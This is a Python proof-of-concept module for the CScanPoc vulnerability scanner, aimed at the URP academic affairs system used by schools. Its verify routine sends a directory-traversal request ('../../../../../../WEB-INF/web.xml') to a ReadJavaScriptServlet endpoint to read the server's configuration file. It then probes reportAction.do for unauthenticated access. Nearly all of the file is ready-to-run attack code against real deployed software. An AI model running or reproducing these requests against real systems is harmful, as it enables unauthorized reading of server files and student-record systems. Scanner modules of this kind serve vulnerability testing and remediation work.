# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'URP_0008'  # 平台漏洞编号，留空
    name = 'URP综合教务系统任意文件读取and未授权访问'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2014-06-22'  # 漏洞公布时间
    desc = '''
        URP教务系统是一个受欢迎的校园多功能教务管理系统。
        URP综合教务系统 /servlet/com.runqian.base.util.ReadJavaScriptServlet?file= 任意文件读取and未授权访问。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=054350'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'URP教务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '00a15405-a9c3-48bb-9489-8bfba35bf096'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 文件读取
            url = arg+"/servlet/com.runqian.base.util.ReadJavaScriptServlet?file=../../../../../../WEB-INF/web.xml"
            code, head, res, errcode, _ = hh.http(url)
            if code == 200 and "<?xml" in res and '<web-app>' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            # 越权访问2
            url = arg+"reportAction.do"
            code, head, res, errcode, _ = hh.http(url)

            if code == 200 and 'reportFiles' in res and 'reportLeftAction.do' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
